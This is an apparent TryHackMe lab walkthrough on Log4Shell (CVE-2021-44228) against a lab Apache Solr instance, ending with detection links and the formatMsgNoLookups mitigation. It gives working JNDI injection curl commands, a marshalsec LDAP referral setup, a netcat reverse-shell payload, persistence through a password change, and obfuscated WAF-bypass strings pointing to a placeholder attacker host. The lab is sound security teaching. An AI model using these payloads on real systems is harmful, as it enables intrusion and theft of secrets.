On December 9th, 2021, the world was made aware of a new vulnerability identified as CVE-2021-44228, affecting the Java logging package log4j. This vulnerability earned a severity score of 10.0 (the most critical designation) and offers remote code trivial remote code execution on hosts engaging with software that utilizes this log4j version. This attack has been dubbed "Log4Shell"

Today, log4j version 2.16.0 is available and patches this vulnerability (JNDI is fully disabled, support for Message Lookups is removed, and the new DoS vulnerability CVE-2021-45046 is not present). https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0

However, the sheer danger of this vulnerability is due to how ubiquitous the logging package is. Millions of applications as well as software providers use this package as a dependency in their own code. While you may be able to patch your own codebase using log4j, other vendors and manufacturers will still need to push their own security updates downstream. Many security researchers have likened this vulnerability to that of Shellshock by the nature of its enormous attack surface. We will see this vulnerability for years to come.

For a growing community-supported list of software and services vulnerable to CVE-2021-44228, check out this GitHub repository:

    https://github.com/YfryTchsGD/Log4jAttackSurface

This room will showcase how you can test for, exploit, and mitigate this vulnerability within Log4j.

While there are a number of other articles, blogs, resources and learning material surrounding CVE-2021-44228, I (the author of this exercise) am particularly partial to these: 

    https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java
    https://log4shell.huntress.com/
    https://www.youtube.com/watch?v=7qoPDq41xhQ

Note from the author:

Please use the information you learn in this room to better the security landscape. Test systems you own, apply patches and mitigations where appropriate, and help the whole industry recover. This is a very current and real-world threat -- whether you are a penetration tester, red teamer, incident responder, security analyst, blue team member, or what have you -- this exercise is to help you and the world understand and gain awareness on this widespread vulnerability. It should not be used for exploitative gain or self-serving financial incentive (I'm looking at you, beg bounty hunters)

Additionally, please bear in mind that the developers of the log4j package work on the open source project as a labor of love and passion. They are volunteer developers that maintain their project in their spare time. There should be absolutely no bashing, shame, or malice towards those individuals. As with all things, please further your knowledge so you can be a pedestal and pillar for the information security community. Educate, share, and help.



The target virtual machine includes software that utilizes this vulnerable log4j package, offering you a playground to explore the vulnerability.

After deploying your virtual machine, you should find that the IP address (accessible within the TryHackMe VPN or through the provided AttackBox) is 10.10.253.236.

To begin, start with basic reconnaissance to understand what ports are open on this machine. This is best done within a Linux distribution, like Kali Linux, ParrotOS, Black Arch (or any other flavor of your choosing) with the nmap command-line tool:
Run a basic nmap scan against vulnerable machine

           
attackbox@tryhackme$ nmap -v 10.10.253.236

        

The application present on this target specifically uses ports that may not be immediately noticed by nmap. For the "whole picture perspective," scan all ports like so:
Scan all ports on machine via nmap

           
attackbox@tryhackme$ nmap -v -p- 10.10.253.236

![image](https://user-images.githubusercontent.com/95479102/146311863-49cfb618-2247-4e99-b8d2-1f8d069acbf9.png)

This target machine is running Apache Solr 8.11.0, one example of software that is known to include this vulnerable log4j package. For the sake of showcasing this vulnerability, the application runs on Java 1.8.0_181.

Explore the web interface accessible at http://10.10.253.236:8983 and click around to get a feel for the application. For more detail on Apache Solr, please refer to their official website. https://solr.apache.org/

This instance of Apache Solr is provisioned with no data whatsoever. It is a flat, vanilla, and absolutely minimum installation -- yet at its core it is still vulnerable to this CVE-2021-44228. 

![image](https://user-images.githubusercontent.com/95479102/146311938-2e619690-57ec-4ca1-a7ae-591b40ac5e5b.png)

![image](https://user-images.githubusercontent.com/95479102/146314634-026fa0b1-7f23-4d08-867c-81cfdd51bc0d.png)

![image](https://user-images.githubusercontent.com/95479102/146316131-91683424-64f6-4e01-bd17-743dfd34850f.png)



Note that the URL endpoint that you have just uncovered needs to be prefaced with the solr/ prefix when viewing it from the web interface. This means that you should visit:

http://10.10.253.236:8983/solr/admin/cores

You also noticed that params seems to be included in the log file. At this point, you may already be beginning to see the attack vector.

The log4j package adds extra logic to logs by "parsing" entries, ultimately to enrich the data -- but may additionally take actions and even evaluate code based off the entry data. This is the gist of CVE-2021-44228. Other syntax might be in fact executed just as it is entered into log files. 

Some examples of this syntax are:

    ${sys:os.name}
    ${sys:user.name}
    ${log4j:configParentLocation}
    ${ENV:PATH}
    ${ENV:HOSTNAME}
    ${java:version}

You may already know the general payload to abuse this log4j vulnerability. The format of the usual syntax that takes advantage of this looks like so:

${jndi:ldap://ATTACKERCONTROLLEDHOST}

This syntax indicates that the log4j will invoke functionality from "JNDI", or the "Java Naming and Directory Interface." Ultimately, this can be used to access external resources, or "references," which is what is weaponized in this attack. 

Notice the ldap:// schema. This indicates that the target will reach out to an endpoint (an attacker controlled location, in the case of this attack) via the LDAP protocol. For the sake of brevity, we will not need to cover all the ins-and-outs and details of LDAP here, but know that this is something we will need to work with as we refine our attack.

For now, know that the target will in fact make a connection to an external location. This is indicated by the ATTACKERCONTROLLEDHOST placeholder in the above syntax. You, acting as the attacker in this scenario, can host a simple listener to view this connection.

The next question is, where could we enter this syntax?

Anywhere that has data logged by the application.

This is the crux of this vulnerability. Unfortunately, it is very hard to determine where the attack surface is for different applications, and ergo, what applications are in fact vulnerable. Simply seeing the presence of log4j files doesn't clue in on the exact version number, or even where or how the application might use the package.

Think back to the previous task. You already discovered that you could supply params to the /solr/admin/cores URL, and now that you have a better understanding of how log4j works, you should understand that this is where you supply your inject syntax. You can simply supply HTTP GET variables or parameters which will then processed and parsed by log4j. All it takes is this single line of text -- and that makes this vulnerability extremely easy to exploit.

Other locations you might supply this JNDI syntax:

    Input boxes, user and password login forms, data entry points within applications
    HTTP headers such as User-Agent, X-Forwarded-For, or other customizable headers
    Any place for user-supplied data

If you would like more information on this JNDI attack vector, please review this Black Hat USA presentation from 2016.

https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf

curl 'http://10.10.253.236:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:9999\}'

![image](https://user-images.githubusercontent.com/95479102/146321410-c46cd0f1-26c2-47f6-8655-f70ff50b7618.png)



At this point, you have verified the target is in fact vulnerable by seeing this connection caught in your netcat listener. However, it made an LDAP request... so all your netcat listener may have seen was non-printable characters (strange looking bytes). We can now build upon this foundation to respond with a real LDAP handler.

We will utilize a open-source and public utility to stage an "LDAP Referral Server". This will be used to essentially redirect the initial request of the victim to another location, where you can host a secondary payload that will ultimately run code on the target. This breaks down like so:

    ${jndi:ldap://attackerserver:1389/Resource} -> reaches out to our LDAP Referral Server
    LDAP Referral Server springboards the request to a secondary http://attackerserver/resource
    The victim retrieves and executes the code present in http://attackerserver/resource

This means we will need an HTTP server, which we could simply host with any of the following options (serving on port 8000):

    python3 -m http.server
    php -S 0.0.0.0:8000
    (or any other busybox httpd or formal web service you might like)

If you get stuck on any of the following steps, we have a video showcasing (using the AttackBox) each step to gain remote code execution: https://youtu.be/OJRqyCHheRE


The first order of business however is obtaining the LDAP Referral Server. We will use the marshalsec utility offered at https://github.com/mbechler/marshalsec

![image](https://user-images.githubusercontent.com/95479102/146742247-ac5c9d8a-658e-4a0a-8f6f-b2167f8f05db.png)

Ultimately, this needs to run Java. Reviewing the README for this utility, it suggests using Java 8. (You may or may not have success using a different version, but to "play by the rules," we will match the same version of Java used on the target virtual machine)

If you are using the TryHackMe AttackBox, you do NOT need to follow the below steps - move onto the next question.
See steps to installing Java 8 locally (follow only if not using AttackBox)

If you are not running 1.8.0_181 within the attack box, you can review the update-alternatives --set steps below to switch to this Java 8 version.

If you are using your own attacking machine connected to the VPN, you may need to download and install Java 1.8.0_181 with the steps below:

You can find a mirror of different Java versions to run on Linux at this location. http://mirrors.rootpei.com/jdk/

Select the jdk-8u181-linux-x64.tar.gz package (or alternatively, download the file attached to this task, added for your convenience).

Download this into your attacking machine, and run the following commands to configure your system to use this Java version by default (adjust the download filesystem path as appropriate):

sudo mkdir /usr/lib/jvm 

cd /usr/lib/jvm

sudo tar xzvf ~/Downloads/jdk-8u181-linux-x64.tar.gz    # modify as needed

sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1

sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws

![image](https://user-images.githubusercontent.com/95479102/146745208-681b50f5-2f77-419f-80de-c12190124dd5.png)

After you have downloaded, extracted, and set the appropriate filesystem settings (the update-alternatives syntax) above, you should be able to run java -version and verify you are in fact now running Java 1.8.0_181.

![image](https://user-images.githubusercontent.com/95479102/146748070-4500f33f-22c0-4198-85a8-ae1f39343911.png)

We must build marshalsec with the Java builder maven. If you do not yet have maven on your system, you can install it through your package manager (not needed if you're using the AttackBox): sudo apt install maven

Next, run the command to build the marshalsec utility:

![image](https://user-images.githubusercontent.com/95479102/146745721-6514afec-ec20-4012-ad71-5de69107f717.png)

![image](https://user-images.githubusercontent.com/95479102/146746033-b000e687-7d3d-4d4a-a01e-86a50b65a010.png)

With the marshalsec utility built, we can start an LDAP referral server to direct connections to our secondary HTTP server (which we will prepare in just a moment). You are more than welcome to dig into the usage, parameters and other settings that can be configured with this tool -- but for the sake of demonstration, the syntax to start the LDAP server is as follows:

java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"

Now that our LDAP server is ready and waiting, we can open a second terminal window to prepare and our final payload and secondary HTTP server.

Ultimately, the log4j vulnerability will execute arbitrary code that you craft within the Java programming language. If you aren't familiar with Java, don't fret -- we will use simple syntax that simply "shells out" to running a system command. In fact, we will retrieve a reverse-shell connection so we can gain control over the target machine!

Create and move into a new directory where you might host this payload. First, create your payload in a text editor of your choice (mousepad, nano, vim, Sublime Text, VS Code, whatever), with the specific name Exploit.java:

![image](https://user-images.githubusercontent.com/95479102/146746718-74d29e4f-b6ff-4e9e-9b86-8ca3a3b7caf3.png)

Modify your attacker IP address and port number as appropriate (we are using 9999 as the example port number as before).

For this payload, you can see we will execute a command on the target, specifically nc -e /bin/bash to call back to our our attacker machine. This target has been configured with ncat for ease of exploitation, though you are more than welcome to experiment with other payloads.

Compile your payload with javac Exploit.java -source 8 -target 8 and verify it succeeded by running the ls command and finding a newly created Exploit.class file; remove "-source 8 -target 8" from command if not using attackbox.
Compile Java exploit code
          
attackbox@tryhackme$ javac Exploit.java -source 8 -target 8

![image](https://user-images.githubusercontent.com/95479102/147379175-e92ef9bc-30ac-4ad5-9e53-d6331d9f3046.png)

With your payload created and compiled, you can now host it by spinning up a temporary HTTP server.  
        
![image](https://user-images.githubusercontent.com/95479102/147379186-7f466867-d425-42a1-823d-4666e8ed33cf.png)

Your payload is created and compiled, it is hosted with an HTTP server in one terminal, your LDAP referral server is up and waiting in another terminal -- next prepare a netcat listener to catch your reverse shell in yet another new terminal window:
Prepare your netcat listener

![image](https://user-images.githubusercontent.com/95479102/147379233-b1521906-ecc1-420e-8bbc-16cffba5dec5.png)
        
Finally, all that is left to do is trigger the exploit and fire off our JNDI syntax! Note the changes in port number (now referring to our LDAP server) and the resource we retrieve, specifying our exploit:
           
attackbox@tryhackme$ curl 'http://10.10.149.239:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'

![image](https://user-images.githubusercontent.com/95479102/147379386-96750501-45e5-4879-9929-c1b84fbb7c16.png)

You have now received initial access and command-and-control on a vanilla, freshly installed Apache Solr instance. This is just one example of many, many vulnerable applications affected by this log4j vulnerability. 

At this point, a threat actor can realistically do whatever they would like with the victim -- whether it be privilege escalation, exfiltration, install persistence, perform lateral movement or any other post-exploitation -- potentially dropping cryptocurrency miners, remote access trojans, beacons and implants or even deploying ransomware. 

All it took was a single string of text, and a little bit of set up with freely available tooling. This is precisely why the Internet has been on fire during the weekend of December 9th, 2021. 

![image](https://user-images.githubusercontent.com/95479102/147379410-352ff34a-9702-4f4a-9bec-c7b84d18d3fd.png)

![image](https://user-images.githubusercontent.com/95479102/147379433-b7c783fe-d014-4766-82a6-62afe5450b3e.png)

![image](https://user-images.githubusercontent.com/95479102/147379441-11b16ac8-74e2-44e9-836f-8c7214d891a3.png)

Now that you have gained a reverse shell connection on the victim machine, you can continue to take any action you might like.

To better understand this log4j vulnerability, let's grant ourselves "better access" so we can explore the machine, analyze the affected logs, and even mitigate the vulnerability!

You may have noticed from your earlier nmap scan that SSH (port 22) was open on the host. We did not know any usernames or passwords at the point, so trying against that protocol would be useless -- but now that you have code execution as a user, you could potentially add private keys or change passwords. 

If you would like to "stabilize your shell" for easier ability in typing commands, you can use the usual upgrade trick (assuming you are running in a bash shell. If you are running within zsh, you will need to have started your netcat listener within a bash subshell... it should be easy enough to re-exploit):

(on the reverse shell) python3 -c "import pty; pty.spawn('/bin/bash')"

(press on your keyboard) Ctrl+Z

(press on your keyboard) Enter

(on your local host) stty raw -echo

(on your local host) fg (you will not see your keystrokes -- trust yourself and hit Enter)

(press on your keyboard) Enter

(press on your keyboard) Enter

(on the reverse shell) export TERM=xterm

You now have a stable shell, where you can safely use the left-and-right arrow keys to move around your input, up-and-down arrow keys to revisit command history, Tab for autocomplete and safely Ctrl+C to stop running programs!

![image](https://user-images.githubusercontent.com/95479102/147379647-9840f2d1-e514-41eb-9e38-db5fae165267.png)

Check super user permissions. For your convenience in this exercise, your user should have sudo privileges without the need for any password.

![image](https://user-images.githubusercontent.com/95479102/147379658-d88dde34-7362-4477-8627-f9c954500b5e.png)

If you would like to grant yourself persistence and access into the machine via SSH, momentarily become root and change the password for the solr user to one of your choosing. This way, you can SSH in as needed!

![image](https://user-images.githubusercontent.com/95479102/147379676-7d8add9b-cf11-4a3d-a8f5-60ca37b6a14f.png)

In another terminal window, SSH into the machine with your new credentials.

![image](https://user-images.githubusercontent.com/95479102/147379693-7b0c094c-67c9-4e8a-b848-b51df440a7b2.png)

Unfortunately, finding applications vulnerable to CVE-2021-44228 "Log4Shell" is hard.

Detecting exploitation might be even harder, considering the unlimited amount of potential bypasses. 

With that said, the information security community has seen an incredible outpouring of effort and support to develop tooling, script, and code to better constrain this threat. While this room won't showcase every technique in detail, you can again find an enormous amount of resources online.

Below are snippets that might help either effort:

    https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes (local, based off hashes of log4j JAR files)
    https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d (local, based off hashes of log4j CLASS files)
    https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228 (listing of vulnerable JAR and CLASS hashes)
    https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1 (local, hunting for vulnerable log4j packages in PowerShell)
    https://github.com/darkarnium/CVE-2021-44228 (local, YARA rules)

As a reminder, a massive resource is available here: 

https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/

To explore our own logs, use your SSH connection or reverse shell to move into the directory where the Solr logs are stored.

![image](https://user-images.githubusercontent.com/95479102/147379715-bcbc7283-0e68-49a4-b565-bd64e427488f.png)

Review the log file that you know is affected by the log4j vulnerability.

Notice your JNDI attack syntax included in the log entries! If you would like to experiment more, try some of the bypasses mentioned in the Task below.

![image](https://user-images.githubusercontent.com/95479102/147379732-4f276982-5449-461d-adad-8ed8b4d0f802.png)

The JNDI payload that we have showcased is the standard and "typical" syntax for performing this attack.

If you are a penetration tester or a red teamer, this syntax might be caught by web application firewalls (WAFs) or easily detected. If you are a blue teamer or incident responder, you should be actively hunting for and detecting that syntax.

Because this attack leverages log4j, the payload can ultimately access all of the same expansion, substitution, and templating tricks that the package makes available. This means that a threat actor could use any sort of tricks to hide, mask, or obfuscate the payload.

With that in mind, there are honestly an unlimited number of bypasses to sneak in this syntax. While we will not be diving into the details in this exercise, you are encouraged to play with them in this environment. Read them carefully to understand what tricks are being used to masquerade the original syntax.

There are numerous resources online that showcase some examples of these bypasses, with a few offered below:

${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}

${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}

${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}

${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}

${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}

${${::-j}ndi:rmi://attackerendpoint.com/}

Note the use of the rmi:// protocol in the last one. This is also another valid technique that can be used with the marshalsec utility -- feel free to experiment!

Additionally, within the log4j engine, you can expand arbitrary environment variables (if this wasn't already bad enough). Consider the damage that could be done even with remote code execution, but a simple LDAP connection and exfiltration of ${env:AWS_SECRET_ACCESS_KEY}

For other techniques, you are strongly encouraged t do your own research. There is a significant amount of information being shared in this Reddit thread: https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/

Gentle reminder, use this knowledge for good. You know what they say... great power, great responsibility and all.

Now that you have acted as the adversary for a little bit, please take off your hacker hat and let's mitigate the vulnerability on this vulnerable machine! Review the mitigation techniques suggested on the Apache Solr website. https://solr.apache.org/security.html

One option is to manually modify the solr.in.sh file with a specific syntax. Let's go down that route for the sake of showcasing this defensive tactic.

If you want to directly SSH into the machine, the credentials are: vagrant as the username, and vagrant as the password.

![image](https://user-images.githubusercontent.com/95479102/147380021-0fc0d91f-69ee-4247-8035-4ddccbd9f74f.png)

he Apache Solr website Security page explains that you can add this specific syntax to the solr.in.sh file:

SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"

Modify the solr.in.sh file with a text editor of your choice. You will need a sudo prefix to borrow root privileges if you are not already root

![image](https://user-images.githubusercontent.com/95479102/147380048-cb2a906e-beb4-4872-8a17-62c73dd8bba2.png)

Now that the configuration file has been modified, the service still needs to be restarted for the changed to take effect.

This process may vary between installations, but for this server, you can restart the service with this syntax:

![image](https://user-images.githubusercontent.com/95479102/147380087-034ebf94-a37f-4577-a2f4-d9ab1e5903b1.png)

To validate that the patch has taken place, start another netcat listener as you had before, and spin up your temporary LDAP referral server and HTTP server (again in separate terminals). 

You will want to recreate the same setup to re-exploit the machine.

You should see that no request is made to your temporary LDAP server, consequently no request is made to your HTTP server, and... no reverse shell is sent back to your netcat listener!
